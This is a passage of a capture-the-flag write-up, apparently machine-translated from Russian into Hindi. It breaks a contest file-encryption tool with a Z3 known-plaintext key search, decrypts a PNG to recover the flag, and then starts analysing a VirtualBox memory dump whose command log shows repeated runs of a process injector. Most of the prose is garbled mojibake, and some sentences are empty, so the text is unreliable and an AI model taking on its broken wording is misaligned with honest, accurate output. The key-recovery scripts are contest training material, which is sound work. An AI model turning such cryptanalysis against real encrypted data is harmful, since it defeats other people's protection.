<strong>рдкреАрдПрдирдЬреА</strong> рдЫрд╡рд┐ рд╣реИред </p><br><pre> <code class="plaintext hljs"># ./locker Required option 'input' missing Usage: ./locker [options] Options: -i, --input in.png Input file path -o, --output out.png.enc Output file path -k, --key 0004081516234200 Encryption key in hex -h, --help Print this help menu</code> </pre> <br><h3 id="locker">  рд▓реЙрдХрд░ </h3><br><p>  рдЖрдИрдбреАрдП рдХреЗ рд▓рд┐рдП рдлрд╝рд╛рдЗрд▓ рдХрд╛ рд╡рд┐рд╢реНрд▓реЗрд╖рдг рдХрд░рдиреЗ рдХреЗ рдмрд╛рдж, рд╣рдо <strong>рдкрд░рд┐рдпреЛрдЬрдирд╛ :: рдореБрдЦреНрдп</strong> рдХрд╛рд░реНрдп рдореЗрдВ рдПрдиреНрдХреНрд░рд┐рдкреНрд╢рди рдПрд▓реНрдЧреЛрд░рд┐рдереНрдо рдкрд╛рддреЗ рд╣реИрдВред </p><br><p><img src="https://habrastorage.org/getpro/habr/post_images/0a3/e68/c77/0a3e68c773b0ff4a7c4d09a321deecd1.png"></p><br><p>  рдЗрд╕рдХрд╛ рдЕрдзреНрдпрдпрди рдХрд░рдиреЗ рдХреЗ рдмрд╛рдж, рд╣рдо рд╕рдордЭрддреЗ рд╣реИрдВ рдХрд┐ рдпрд╣ рдПрдХ <strong>рдмреНрд▓реЙрдХ рд╕рд┐рдлрд░</strong> (рдИрд╕реАрдмреА) рд╣реИ, рдЬрд┐рд╕рдореЗрдВ <strong>32 рдмрд┐рдЯреНрд╕</strong> рдХрд╛ рдмреНрд▓реЙрдХ рдЖрдХрд╛рд░, <strong>64 рдмрд┐рдЯреНрд╕</strong> рдХрд╛ рдПрдХ рдХреБрдВрдЬреА рдЖрдХрд╛рд░ рдФрд░ <strong>77</strong> рдХреЗ рд░рд╛рдЙрдВрдб рдХреА рд╕рдВрдЦреНрдпрд╛ рд╣реИред </p><br><h5 id="versiya-na-python">  рдкрд╛рдпрдерди рд╕рдВрд╕реНрдХрд░рдг </h5><br><pre> <code class="python hljs"><span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">def</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">encrypt</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(p, k, rounds=</span></span><span class="hljs-number"><span class="hljs-function"><span class="hljs-params"><span class="hljs-number">77</span></span></span></span><span class="hljs-function"><span class="hljs-params">)</span></span></span><span class="hljs-function">:</span></span> <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> i <span class="hljs-keyword"><span class="hljs-keyword">in</span></span> range(<span class="hljs-number"><span class="hljs-number">0</span></span>, rounds): n = (p &gt;&gt; <span class="hljs-number"><span class="hljs-number">4</span></span>) &amp; <span class="hljs-number"><span class="hljs-number">1</span></span> n |= (p &gt;&gt; <span class="hljs-number"><span class="hljs-number">26</span></span>) &amp; <span class="hljs-number"><span class="hljs-number">0xE0</span></span> n |= (p &gt;&gt; <span class="hljs-number"><span class="hljs-number">22</span></span>) &amp; <span class="hljs-number"><span class="hljs-number">0x10</span></span> n |= (p &gt;&gt; <span class="hljs-number"><span class="hljs-number">13</span></span>) &amp; <span class="hljs-number"><span class="hljs-number">8</span></span> n |= (p &gt;&gt; <span class="hljs-number"><span class="hljs-number">7</span></span>) &amp; <span class="hljs-number"><span class="hljs-number">4</span></span> n |= (p &gt;&gt; <span class="hljs-number"><span class="hljs-number">4</span></span>) &amp; <span class="hljs-number"><span class="hljs-number">2</span></span> x = p ^ k x ^= p &gt;&gt; <span class="hljs-number"><span class="hljs-number">12</span></span> x ^= p &gt;&gt; <span class="hljs-number"><span class="hljs-number">20</span></span> x &amp;= <span class="hljs-number"><span class="hljs-number">1</span></span> y = <span class="hljs-number"><span class="hljs-number">1</span></span> &lt;&lt; n y &amp;= <span class="hljs-number"><span class="hljs-number">0xBB880F0FC30F0000</span></span> y &gt;&gt;= n y &amp;= <span class="hljs-number"><span class="hljs-number">1</span></span> <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> x == y: p &amp;= <span class="hljs-number"><span class="hljs-number">0xFFFFFFFE</span></span> <span class="hljs-keyword"><span class="hljs-keyword">else</span></span>: p |= <span class="hljs-number"><span class="hljs-number">1</span></span> k = ror(k, <span class="hljs-number"><span class="hljs-number">1</span></span>, <span class="hljs-number"><span class="hljs-number">64</span></span>) p = ror(p, <span class="hljs-number"><span class="hljs-number">1</span></span>, <span class="hljs-number"><span class="hljs-number">32</span></span>) <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> p</code> </pre> <br><h3 id="secret-key">  рдЧреБрдкреНрдд рдХреБрдВрдЬреА </h3><br><p>  рд╣рдо рдЬрд╛рдирддреЗ рд╣реИрдВ рдХрд┐ рдПрдиреНрдХреНрд░рд┐рдкреНрдЯ рдХреА рдЧрдИ рдлрд╝рд╛рдЗрд▓ рдПрдХ <strong>PNG</strong> рдЫрд╡рд┐ рд╣реИред <br>  рддрджрдиреБрд╕рд╛рд░, рд╣рдо рдлрд╝рд╛рдЗрд▓ рд╣реЗрдбрд░ рдХреЗ рд░реВрдк рдореЗрдВ <strong>рдкреНрд▓реЗрдирдЯреЗрдХреНрд╕реНрдЯ рд╕рд┐рдлрд░рдЯреЗрдХреНрдЯ рдХреЗ</strong> рдПрдХ <strong>рдЬреЛрдбрд╝реЗ рдХреЛ</strong> рдЬрд╛рдирддреЗ рд╣реИрдВ (рдпрд╣ рдкреАрдПрдирдЬреА рдХреЗ рд▓рд┐рдП рдорд╛рдирдХ рд╣реИ)ред <br><img src="https://habrastorage.org/getpro/habr/post_images/0b7/ecb/770/0b7ecb770732ca1fdc9f8cba8f0d8248.png"></p><br><p>  рдЖрдЗрдП рд╕рд░рд▓ рддрд░реАрдХреЗ рд╕реЗ рдкреНрд░рдпрд╛рд╕ рдХрд░реЗрдВ рдФрд░ рдПрдиреНрдХреНрд░рд┐рдкреНрд╢рди рдХреБрдВрдЬреА рдХреЛ рдЦреЛрдЬрдиреЗ рдХреЗ рд▓рд┐рдП <strong>рд╢реНрд░реАрдорддреА рд╕реЙрд▓реНрд╡рд░</strong> ( <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=hi&amp;u=" title="рдЬреЗрдб 3">рдЬреЗрдб 3</a> ) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВред <br>  рдРрд╕рд╛ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, рдХреЛрдб рдХреЛ рдереЛрдбрд╝рд╛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░реЗрдВ рдФрд░ рдЗрдирдкреБрдЯ рдХреЛ рдПрдХ рдЬреЛрдбрд╝реА рд╕рд╛рджрд╛ рдЯреЗрдХреНрд╕реНрдЯ рд╕рд┐рдлрд░рдЯреЗрдХреНрд╕реНрдЯ рдореЗрдВ рдЬрдорд╛ рдХрд░реЗрдВред </p><br><h5 id="task6_keypy">  task6_key.py </h5><br><pre> <code class="python hljs"><span class="hljs-keyword"><span class="hljs-keyword">import</span></span> sys <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> struct <span class="hljs-keyword"><span class="hljs-keyword">from</span></span> z3 <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> * <span class="hljs-comment"><span class="hljs-comment"># PNG file signature (8 bytes) + IHDR chunk header (8 bytes) PLAIN_TEXT = b'\x89\x50\x4E\x47\x0D\x0A\x1A\x0A\x00\x00\x00\x0D\x49\x48\x44\x52' BLOCK_SIZE = 4 def encrypt(p, k, rounds=77): for i in range(0, rounds): n = LShR(p, 4) &amp; 1 n |= LShR(p, 26) &amp; 0xE0 n |= LShR(p, 22) &amp; 0x10 n |= LShR(p, 13) &amp; 8 n |= LShR(p, 7) &amp; 4 n |= LShR(p, 4) &amp; 2 x = k ^ ZeroExt(32, p) x ^= LShR(ZeroExt(32, p), 12) x ^= LShR(ZeroExt(32, p), 20) x &amp;= 1 y = 1 &lt;&lt; ZeroExt(32, n) y &amp;= 0xBB880F0FC30F0000 y = LShR(y, ZeroExt(32, n)) y &amp;= 1 p = If(x == y, p &amp; 0xFFFFFFFE, p | 1) p = RotateRight(p, 1) k = RotateRight(k, 1) return p def qword_le_to_be(v): pv = struct.pack('&lt;Q', v) uv = struct.unpack('&gt;Q', pv) return uv[0] if len(sys.argv) &lt; 2: sys.exit('no input file specified') with open(sys.argv[1], 'rb') as encrypted_file: k = BitVec('k', 64) key = k solver = Solver() for i in range(0, len(PLAIN_TEXT), BLOCK_SIZE): # prepare plain text and cipher text pairs pt = struct.unpack('&lt;L', PLAIN_TEXT[i:i + BLOCK_SIZE])[0] ct = struct.unpack('&lt;L', encrypted_file.read(BLOCK_SIZE))[0] p = BitVecVal(pt, 32) e = BitVecVal(ct, 32) solver.add(encrypt(p, k) == e) print('solving ...') if solver.check() == sat: encryption_key = solver.model()[key].as_long() print('key: %016X' % qword_le_to_be(encryption_key))</span></span></code> </pre> <br><p>  рд╕рдорд╛рдзрд╛рди: </p><br><pre> <code class="plaintext hljs">&gt; python task6_key.py "secret.png.enc" solving ... key: AE34C511A8238BCC</code> </pre> <br><h3 id="unlocker"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> Unlocker </font></font></h3><br><p>          . <br>                  . </p><br><h5 id="task6_unlockerpy"> task6_unlocker.py </h5><br><pre> <code class="python hljs"><span class="hljs-keyword"><span class="hljs-keyword">import</span></span> sys <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> time <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> struct <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> binascii BLOCK_SIZE = <span class="hljs-number"><span class="hljs-number">4</span></span> ror = <span class="hljs-keyword"><span class="hljs-keyword">lambda</span></span> val, r_bits, max_bits: \ ((val &amp; (<span class="hljs-number"><span class="hljs-number">2</span></span>**max_bits<span class="hljs-number"><span class="hljs-number">-1</span></span>)) &gt;&gt; r_bits%max_bits) | \ (val &lt;&lt; (max_bits-(r_bits%max_bits)) &amp; (<span class="hljs-number"><span class="hljs-number">2</span></span>**max_bits<span class="hljs-number"><span class="hljs-number">-1</span></span>)) rol = <span class="hljs-keyword"><span class="hljs-keyword">lambda</span></span> val, r_bits, max_bits: \ (val &lt;&lt; r_bits%max_bits) &amp; (<span class="hljs-number"><span class="hljs-number">2</span></span>**max_bits<span class="hljs-number"><span class="hljs-number">-1</span></span>) | \ ((val &amp; (<span class="hljs-number"><span class="hljs-number">2</span></span>**max_bits<span class="hljs-number"><span class="hljs-number">-1</span></span>)) &gt;&gt; (max_bits-(r_bits%max_bits))) <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">def</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">decrypt</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(e, k, rounds=</span></span><span class="hljs-number"><span class="hljs-function"><span class="hljs-params"><span class="hljs-number">77</span></span></span></span><span class="hljs-function"><span class="hljs-params">)</span></span></span><span class="hljs-function">:</span></span> dk = ror(k, <span class="hljs-number"><span class="hljs-number">13</span></span>, <span class="hljs-number"><span class="hljs-number">64</span></span>) <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> i <span class="hljs-keyword"><span class="hljs-keyword">in</span></span> range(<span class="hljs-number"><span class="hljs-number">0</span></span>, rounds): dk = rol(dk, <span class="hljs-number"><span class="hljs-number">1</span></span>, <span class="hljs-number"><span class="hljs-number">64</span></span>) e = rol(e, <span class="hljs-number"><span class="hljs-number">1</span></span>, <span class="hljs-number"><span class="hljs-number">32</span></span>) n = (e &gt;&gt; <span class="hljs-number"><span class="hljs-number">4</span></span>) &amp; <span class="hljs-number"><span class="hljs-number">1</span></span> n |= (e &gt;&gt; <span class="hljs-number"><span class="hljs-number">26</span></span>) &amp; <span class="hljs-number"><span class="hljs-number">0xE0</span></span> n |= (e &gt;&gt; <span class="hljs-number"><span class="hljs-number">22</span></span>) &amp; <span class="hljs-number"><span class="hljs-number">0x10</span></span> n |= (e &gt;&gt; <span class="hljs-number"><span class="hljs-number">13</span></span>) &amp; <span class="hljs-number"><span class="hljs-number">8</span></span> n |= (e &gt;&gt; <span class="hljs-number"><span class="hljs-number">7</span></span>) &amp; <span class="hljs-number"><span class="hljs-number">4</span></span> n |= (e &gt;&gt; <span class="hljs-number"><span class="hljs-number">4</span></span>) &amp; <span class="hljs-number"><span class="hljs-number">2</span></span> x = e ^ dk x ^= e &gt;&gt; <span class="hljs-number"><span class="hljs-number">12</span></span> x ^= e &gt;&gt; <span class="hljs-number"><span class="hljs-number">20</span></span> x &amp;= <span class="hljs-number"><span class="hljs-number">1</span></span> y = <span class="hljs-number"><span class="hljs-number">1</span></span> &lt;&lt; n y &amp;= <span class="hljs-number"><span class="hljs-number">0xBB880F0FC30F0000</span></span> y &gt;&gt;= n y &amp;= <span class="hljs-number"><span class="hljs-number">1</span></span> <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> x == y: e &amp;= <span class="hljs-number"><span class="hljs-number">0xFFFFFFFE</span></span> <span class="hljs-keyword"><span class="hljs-keyword">else</span></span>: e |= <span class="hljs-number"><span class="hljs-number">1</span></span> <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> e <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> len(sys.argv) &lt; <span class="hljs-number"><span class="hljs-number">2</span></span>: sys.exit(<span class="hljs-string"><span class="hljs-string">'no input file specified'</span></span>) <span class="hljs-keyword"><span class="hljs-keyword">elif</span></span> len(sys.argv) &lt; <span class="hljs-number"><span class="hljs-number">3</span></span>: sys.exit(<span class="hljs-string"><span class="hljs-string">'no output file specified'</span></span>) <span class="hljs-keyword"><span class="hljs-keyword">elif</span></span> len(sys.argv) &lt; <span class="hljs-number"><span class="hljs-number">4</span></span>: sys.exit(<span class="hljs-string"><span class="hljs-string">'no encryption key specified'</span></span>) <span class="hljs-keyword"><span class="hljs-keyword">try</span></span>: key = binascii.unhexlify(sys.argv[<span class="hljs-number"><span class="hljs-number">3</span></span>]) key = struct.unpack(<span class="hljs-string"><span class="hljs-string">'&lt;Q'</span></span>, key)[<span class="hljs-number"><span class="hljs-number">0</span></span>] <span class="hljs-keyword"><span class="hljs-keyword">except</span></span>: sys.exit(<span class="hljs-string"><span class="hljs-string">'non-hexadecimal encryption key'</span></span>) print(<span class="hljs-string"><span class="hljs-string">'unlocking ...'</span></span>) start_time = time.time() <span class="hljs-keyword"><span class="hljs-keyword">with</span></span> open(sys.argv[<span class="hljs-number"><span class="hljs-number">1</span></span>], <span class="hljs-string"><span class="hljs-string">'rb'</span></span>) <span class="hljs-keyword"><span class="hljs-keyword">as</span></span> ef: <span class="hljs-keyword"><span class="hljs-keyword">with</span></span> open(sys.argv[<span class="hljs-number"><span class="hljs-number">2</span></span>], <span class="hljs-string"><span class="hljs-string">'wb'</span></span>) <span class="hljs-keyword"><span class="hljs-keyword">as</span></span> df: <span class="hljs-keyword"><span class="hljs-keyword">while</span></span> <span class="hljs-keyword"><span class="hljs-keyword">True</span></span>: ct = ef.read(BLOCK_SIZE) <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> <span class="hljs-keyword"><span class="hljs-keyword">not</span></span> ct: <span class="hljs-keyword"><span class="hljs-keyword">break</span></span> ct = struct.unpack(<span class="hljs-string"><span class="hljs-string">'&lt;L'</span></span>, ct)[<span class="hljs-number"><span class="hljs-number">0</span></span>] pt = decrypt(ct, key) pt = struct.pack(<span class="hljs-string"><span class="hljs-string">'&lt;L'</span></span>, pt) df.write(pt) print(<span class="hljs-string"><span class="hljs-string">'done, took %.3f seconds.'</span></span> % (time.time() - start_time))</code> </pre> <br><p>  ,         . </p><br><pre> <code class="plaintext hljs">&gt; python task6_unlocker.py "secret.png.enc" "secret.png" "AE34C511A8238BCC" unlocking ... done, took 49.669 seconds.</code> </pre> <br><h5 id="secretpng"> secret.png </h5><br><p><img src="https://habrastorage.org/getpro/habr/post_images/9fa/18b/2b2/9fa18b2b2264379bd89ebcaaf62c3006.png"></p><br><blockquote> ZN{RA$T0GR@PHY_H3RTS} </blockquote></div></div><br><h2><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> рджрд┐рди 7. рдмреАрдк рдмреАрдк! </font></font></h2><br><div class="scrollable-table"><table><tbody><tr><td align="center"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> рд╡рд┐рдЬреЗрддрд╛рдУрдВ </font></font></td></tr><tr><td align="center"> <b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">рдкрд╣рд▓рд╛ рд╕реНрдерд╛рди</font></font></b> </td></tr><tr><td align="center"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> sysenter </font></font></td></tr></tbody></table></div><br><p><font style="vertical-align: inherit;"></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=hi&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">рд╕реНрдХреВрд▓</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> рд╣реИрдХ рджреНрд╡рд╛рд░рд╛ рдкреНрд░рджрд╛рди рдХреА рдЧрдИ рдЕрдВрддрд┐рдо рд╣реИрдХ рдЦреЛрдЬ </font><font style="vertical-align: inherit;">ред </font><font style="vertical-align: inherit;">рдкреНрд░рддрд┐рднрд╛рдЧрд┐рдпреЛрдВ рдХреЛ рдПрдХ рдореЗрдореЛрд░реА рдбрдВрдк рдкрд╛рд░реНрд╕ рдХрд░рдирд╛ рдерд╛ рдЬрд┐рд╕рдореЗрдВ рдлрд╝рд╛рдЗрд▓реЛрдВ рдХреЛ рдПрдиреНрдХреНрд░рд┐рдкреНрдЯ рдХрд░рдиреЗ рд╡рд╛рд▓рд╛ рдкреНрд░реЛрдЧреНрд░рд╛рдо рд╕реНрдерд┐рдд рдерд╛ред </font><font style="vertical-align: inherit;">рдЗрд╕ рддрдереНрдп рд╕реЗ рдЬрдЯрд┐рд▓ рд╣реИ рдХрд┐ рдХрд╛рд░реНрдпрдХреНрд░рдо рдХреЛ рдХрдИ рднрд╛рдЧреЛрдВ рдореЗрдВ рд╡рд┐рднрд╛рдЬрд┐рдд рдХрд┐рдпрд╛ рдЧрдпрд╛ рдерд╛, рдЬрд┐рдиреНрд╣реЗрдВ рдЕрдиреНрдп рдкреНрд░рдХреНрд░рд┐рдпрд╛рдУрдВ рдореЗрдВ рдЗрдВрдЬреЗрдХреНрдЯ рдХрд┐рдпрд╛ рдЧрдпрд╛ рдерд╛ред</font></font></p><br><div class="spoiler"> <b class="spoiler_title"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">рд╕рд╛рддрд╡реЗрдВ рджрд┐рди рдХреЗ рдХрд╛рд░реНрдп рдХрд╛ рдирд┐рд░реНрдгрдп</font></font></b> <div class="spoiler_text"><p> Something that looks like VirtualBox RAM dump is provided to us. </p><br><p> We can try volatility, but it seems that it unable to locate required structures to restore Virtual Memory layout. </p><br><p><img src="https://habrastorage.org/webt/go/1l/7i/go1l7imiojbikday6awhxdrbw58.png"></p><br><p> No process memory for us today, so we will have to work with fragmented memory. </p><br><p> First of all let's precache strings from the dump. </p><br><pre> <code class="plaintext hljs">strings &gt; strings_ascii.txt strings -el &gt; strings_wide.txt</code> </pre> <br><p> Most interesting one is command execution log: </p><br><pre> <code class="plaintext hljs">cd .. .\injector.exe 192.168.1.65 .\run.exe .\storage cd .\server\ .\run.exe block1 .\run.exe block0 cd Z:\zn_2019\ cd .\server\ cd .. .\injector.exe 192.168.1.65 cd Z:\zn_2019\ .\injector.exe 192.168.1.65 cd .. touch echo echo qwe echo qwe &gt; flag.txt .\injector.exe 192.168.1.65 echo qwe &gt; flag.txt .\injector.exe 192.168.1.65 echo qwe &gt; flag.txt .\injector.exe 192.168.1.65 echo qwe &gt; flag.txt cd Z:\zn_2019\ .\injector.exe 192.168.1.65 cd Z:\zn_2019\ injector.exe 1921.68.1.65 injector.exe 192.68.1.65 ./injector.exe 192.68.1.65 .\injector.exe 192.168.1.65 cd Z:\zn_2019\ .\injector.exe 192.168.1.65 cd Z:\zn_2019\ .\injector.exe 192.168.1.65 cd Z:\zn_2019\server\ run storage .\run.exe .\storage cd Z:\zn_2019\server\ .\run.exe block1 cd Z:\zn_2019\server\ .\run.exe block0 cd .. .\injector.exe 192.168.1.65 cd Z:\zn_2019\ .\injector.exe 192.168.1.65 cd Z:\zn_2019\ .\injector.exe 192.168.1.65 cd Z:\zn_2019\ .\injector.exe 192.168.1.65 cd Z:\zn_2019\ .\injector.exe 192.168.1.65 cd Z:\zn_2019\ .\Injector2.exe 192.168.1.65 cd Z:\zn_2019\ .\injector.exe 192.168.1.65 .\injector2.exe 192.168.1.65 cd Z:\zn_2019\ .\Injector2.exe 192.168.1.65 '.\ConsoleApplication5 (2).exe' 192.168.1.65</code> </pre> <br><p> <strong>Not Important note:</strong> </p><br><p> <em>Not sure what <strong>SIGN.MEDIA</strong> is, but it looks like a cached file list from VirtualBox Network Share (Is this from Windows Registry?).</em> </p><br><pre> <code class="plaintext hljs">SIGN.MEDIA=138A400 zn_2019\ConsoleApplication5 (2).exe SIGN.MEDIA=138A400 zn_2019\ConsoleApplication5.exe SIGN.MEDIA=138A400 zn_2019\Injector2.exe SIGN.MEDIA=138A400 zn_2019\Is_it_you_suspended_or_me.exe SIGN.MEDIA=138A400 zn_2019\NOTE1.exe SIGN.MEDIA=138A400 zn_2019\NOTE1.exe SIGN.MEDIA=138A400 zn_2019\With_little_debug.exe SIGN.MEDIA=138A400 zn_2019\im_spawned_you_so_i_should_kill_you.exe SIGN.MEDIA=138A400 zn_2019\injector.exe SIGN.MEDIA=138A400 zn_2019\nnnn.exe SIGN.MEDIA=138A400 zn_2019\not_so_sleepy_r_we.exe SIGN.MEDIA=138A400 zn_2019\note.exe SIGN.MEDIA=138A400 zn_2019\note2.exe SIGN.MEDIA=138A400 zn_2019\note3.exe SIGN.MEDIA=138A400 zn_2019\note4.exe SIGN.MEDIA=138A400 zn_2019\random.exe SIGN.MEDIA=138A400 zn_2019\z.exe SIGN.MEDIA=17582C zn_2019\Injector2.exe SIGN.MEDIA=17582C zn_2019\injector.exe SIGN.MEDIA=196C2 zn_2019\server\run.exe SIGN.MEDIA=1C176B0 zn_2019\ConsoleApplication5 (2).exe SIGN.MEDIA=1C176B0 zn_2019\ConsoleApplication5.exe SIGN.MEDIA=1C176B0 zn_2019\Injector2.exe SIGN.MEDIA=1C176B0 zn_2019\injector.exe SIGN.MEDIA=1C176B0 zn_2019\note.exe SIGN.MEDIA=1C176B0 zn_2019\note2.exe SIGN.MEDIA=1C176B0 zn_2019\note3.exe SIGN.MEDIA=1C1D02C zn_2019\ConsoleApplication5 (2).exe SIGN.MEDIA=1C1D02C zn_2019\ConsoleApplication5.exe SIGN.MEDIA=1C1D02C zn_2019\Injector2.exe SIGN.MEDIA=1C1D02C zn_2019\Is_it_you_suspended_or_me.exe SIGN.MEDIA=1C1D02C zn_2019\With_little_debug.exe SIGN.MEDIA=1C1D02C zn_2019\injector.exe SIGN.MEDIA=1C1D02C zn_2019\not_so_sleepy_r_we.exe SIGN.MEDIA=1C1D02C zn_2019\note.exe SIGN.MEDIA=1C1D02C zn_2019\note2.exe SIGN.MEDIA=1C1D02C zn_2019\note3.exe SIGN.MEDIA=1C1DAB0 zn_2019\ConsoleApplication5 (2).exe SIGN.MEDIA=1C1DAB0 zn_2019\ConsoleApplication5.exe SIGN.MEDIA=1C1DAB0 zn_2019\Injector2.exe SIGN.MEDIA=1C1DAB0 zn_2019\With_little_debug.exe SIGN.MEDIA=1C1DAB0 zn_2019\injector.exe SIGN.MEDIA=1C1DAB0 zn_2019\note.exe SIGN.MEDIA=1C1DAB0 zn_2019\note2.exe SIGN.MEDIA=1C1DAB0 zn_2019\note3.exe SIGN.MEDIA=1C30058 zn_2019\ConsoleApplication5 (2).exe SIGN.MEDIA=1C30058 zn_2019\ConsoleApplication5.exe SIGN.MEDIA=1C30058 zn_2019\Injector2.exe SIGN.MEDIA=1C30058 zn_2019\Is_it_you_suspended_or_me.exe SIGN.MEDIA=1C30058 zn_2019\With_little_debug.exe SIGN.MEDIA=1C30058 zn_2019\injector.exe SIGN.MEDIA=1C30058 zn_2019\injector.exe SIGN.MEDIA=1C30058 zn_2019\not_so_sleepy_r_we.exe SIGN.MEDIA=1C30058 zn_2019\note.exe SIGN.MEDIA=1C30058 zn_2019\note2.exe SIGN.MEDIA=1C30058 zn_2019\note3.exe SIGN.MEDIA=1C89400 zn_2019\ConsoleApplication5 (2).exe SIGN.MEDIA=1C89400 zn_2019\ConsoleApplication5.exe SIGN.MEDIA=1C89400 zn_2019\Injector2.exe SIGN.MEDIA=1C89400 zn_2019\Is_it_you_suspended_or_me.exe SIGN.MEDIA=1C89400 zn_2019\NOTE1.exe SIGN.MEDIA=1C89400 zn_2019\With_little_debug.exe SIGN.MEDIA=1C89400 zn_2019\im_spawned_you_so_i_should_kill_you.exe SIGN.MEDIA=1C89400 zn_2019\injector.exe SIGN.MEDIA=1C89400 zn_2019\nnnn.exe SIGN.MEDIA=1C89400 zn_2019\not_so_sleepy_r_we.exe SIGN.MEDIA=1C89400 zn_2019\note.exe SIGN.MEDIA=1C89400 zn_2019\note.exe SIGN.MEDIA=1C89400 zn_2019\note2.exe SIGN.MEDIA=1C89400 zn_2019\note3.exe SIGN.MEDIA=1C89400 zn_2019\note4.exe SIGN.MEDIA=1C8A800 zn_2019\ConsoleApplication5 (2).exe SIGN.MEDIA=1C8A800 zn_2019\ConsoleApplication5.exe SIGN.MEDIA=1C8A800 zn_2019\Injector2.exe SIGN.MEDIA=1C8A800 zn_2019\Is_it_you_suspended_or_me.exe SIGN.MEDIA=1C8A800 zn_2019\NOTE1.exe SIGN.MEDIA=1C8A800 zn_2019\With_little_debug.exe SIGN.MEDIA=1C8A800 zn_2019\im_spawned_you_so_i_should_kill_you.exe SIGN.MEDIA=1C8A800 zn_2019\injector.exe SIGN.MEDIA=1C8A800 zn_2019\nnnn.exe SIGN.MEDIA=1C8A800 zn_2019\not_so_sleepy_r_we.exe SIGN.MEDIA=1C8A800 zn_2019\note.exe SIGN.MEDIA=1C8A800 zn_2019\note2.exe SIGN.MEDIA=1C8A800 zn_2019\note3.exe SIGN.MEDIA=1C8A800 zn_2019\note4.exe SIGN.MEDIA=2D702C zn_2019\ConsoleApplication5 (2).exe SIGN.MEDIA=3EDC2 zn_2019\server\a.exe SIGN.MEDIA=3EDC2 zn_2019\server\hui.exe SIGN.MEDIA=3EDC2 zn_2019\server\run.exe SIGN.MEDIA=4482C zn_2019\ConsoleApplication5.exe SIGN.MEDIA=4482C zn_2019\PEview.exe SIGN.MEDIA=5B0058 zn_2019\ConsoleApplication5 (2).exe SIGN.MEDIA=5B0058 zn_2019\ConsoleApplication5.exe SIGN.MEDIA=5B0058 zn_2019\Injector2.exe SIGN.MEDIA=5B0058 zn_2019\injector.exe SIGN.MEDIA=5B0058 zn_2019\note.exe SIGN.MEDIA=A856FE8 zn_2019\server\hui\Discord.exe SIGN.MEDIA=A856FE8 zn_2019\server\hui\Far.exe SIGN.MEDIA=A856FE8 zn_2019\server\hui\FileZillaFTPclient.exe SIGN.MEDIA=A856FE8 zn_2019\server\hui\InputDirector.exe SIGN.MEDIA=A856FE8 zn_2019\server\hui\KeePass.exe SIGN.MEDIA=A856FE8 zn_2019\server\hui\PicPick.exe SIGN.MEDIA=A856FE8 zn_2019\server\hui\Skype.exe SIGN.MEDIA=A856FE8 zn_2019\server\hui\UpdateManager.exe SIGN.MEDIA=A856FE8 zn_2019\server\hui\VBoxManager.exe SIGN.MEDIA=A856FE8 zn_2019\server\hui\idaq.exe SIGN.MEDIA=A856FE8 zn_2019\server\hui\javaw.exe SIGN.MEDIA=A856FE8 zn_2019\server\hui\lunix.exe SIGN.MEDIA=A856FE8 zn_2019\server\hui\paint.exe SIGN.MEDIA=A856FE8 zn_2019\server\hui\python3.7.exe SIGN.MEDIA=A856FE8 zn_2019\server\hui\r.exe SIGN.MEDIA=A856FE8 zn_2019\server\hui\svghost.exe SIGN.MEDIA=A856FE8 zn_2019\server\hui\tsm.exe SIGN.MEDIA=A856FE8 zn_2019\server\hui\usha.exe SIGN.MEDIA=A856FE8 zn_2019\server\hui\video_xxx_kopati4_nadaval_ogurcov_kroshu.mp4.exe SIGN.MEDIA=AB82C zn_2019\ConsoleApplication5.exe SIGN.MEDIA=AB82C zn_2019\injector.exe SIGN.MEDIA=B06D4C64 zn_2019\server\a.exe SIGN.MEDIA=B06D4C64 zn_2019\server\hui.exe SIGN.MEDIA=B06D4C64 zn_2019\server\run.exe SIGN.MEDIA=B06D4C64 zn_2019\server\video_xxx_kopati4_nadaval_ogurcov_kroshu.mp4.exe SIGN.MEDIA=BA802 zn_2019\server\run.exe SIGN.MEDIA=E00058 zn_2019\ConsoleApplication5 (2).exe SIGN.MEDIA=E00058 zn_2019\ConsoleApplication5.exe SIGN.MEDIA=E00058 zn_2019\Injector2.exe SIGN.MEDIA=E00058 zn_2019\injector.exe SIGN.MEDIA=E00058 zn_2019\note.exe SIGN.MEDIA=E00058 zn_2019\note2.exe SIGN.MEDIA=E00058 zn_2019\note2.exe SIGN.MEDIA=E9982 zn_2019\server\run.exe</code> </pre> <br><p> I used my old tool to get filesystem structure out of NTFS records (a lot of FILE records usually cached in RAM). </p><br><p><img src="https://habrastorage.org/webt/x7/bf/tq/x7bftqu47ozkqm1ps96i6luh9za.png"><br><img 